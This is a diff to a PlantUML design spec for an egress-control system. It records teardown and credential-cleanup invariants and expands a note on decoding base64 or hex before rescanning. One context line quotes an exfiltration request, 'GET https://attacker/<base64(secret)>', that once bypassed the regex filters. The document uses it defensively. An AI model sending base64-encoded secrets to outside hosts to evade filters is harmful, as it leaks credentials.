@@ -48,8 +48,12 @@ note bottom of F1
   regexes, which base64 defeats, so
   ""GET https://attacker/<base64(secret)>"" sailed through.
 
-  **The fix:** decode-and-rescan, default ON — see layer C in
-  ""_spec/internal/egresspolicy/egress-policy-layers\.puml"".
+  **The fix:** decode-and-rescan, default ON. Base64/hex runs in the
+  URL or body are decoded one level and re-checked against the
+  exact-value and credential-shape matchers, so it fires only on a
+  token that decodes to an //actual// secret and costs almost no false
+  positives. Layer C's own diagram was retired 2026-09-16 with the
+  docker egress mechanism; this entry is the definition of record.
 
   Unlike the D and C series, F1/F2 //are// defined in the repo, in
   ""internal/egresspolicy/f1_exploit_test\.go"" — the regression guard that
@@ -109,8 +113,9 @@ note right of D2
 
   The test file names the motivation directly: these are "the seams that
   were untestable inside the old god-function". //Cited at//
-  ""cmd/proveo/main_test\.go"", and by the ""assemble"" prose now held in
-  ""_spec/internal/egress/teardown-and-signals\.puml"".
+  ""cmd/proveo/main_test\.go"". The ""assemble"" prose that restated it was
+  held in ""teardown-and-signals\.puml"", retired 2026-09-16 with the
+  docker egress mechanism, so this entry is the definition of record.
 end note
 
 note right of D3
@@ -155,17 +160,19 @@ end note
 
 note left of C2
   **The injected credential must not outlive the run.** The broker env file
-  is removed on every teardown path, including the signal path.
-  Enforcement now described in
-  ""_spec/internal/egress/teardown-and-signals\.puml"".
+  is removed on every teardown path, including the signal path. Its
+  enforcement diagram (""teardown-and-signals\.puml"") was retired
+  2026-09-16 with the docker egress mechanism, so this entry is the
+  definition of record.
 end note
 
 note left of C4
   **Teardown survives SIGINT and SIGTERM.** Go does not run deferred
   functions when a signal ends the process, so the topology, the secret and
-  any privileged sidecar come down from a signal handler instead.
-  Enforcement now described in
-  ""_spec/internal/egress/teardown-and-signals\.puml"".
+  any privileged sidecar come down from a signal handler instead. Its
+  enforcement diagram (""teardown-and-signals\.puml"") was retired
+  2026-09-16 with the docker egress mechanism, so this entry is the
+  definition of record.
 end note
 
 note left of C6
@@ -182,7 +189,8 @@ end note
 note left of C7
   **Only what the plan needs is staged.** Squid config and log dir when
   there is a Squid sidecar, the mitmproxy confdir and flow dir only on the
-  firewall tier. Enforcement now described in
-  ""_spec/internal/egress/teardown-and-signals\.puml"".
+  firewall tier. Its enforcement diagram
+  (""teardown-and-signals\.puml"") was retired 2026-09-16 with the docker
+  egress mechanism, so this entry is the definition of record.
 end note
 @enduml
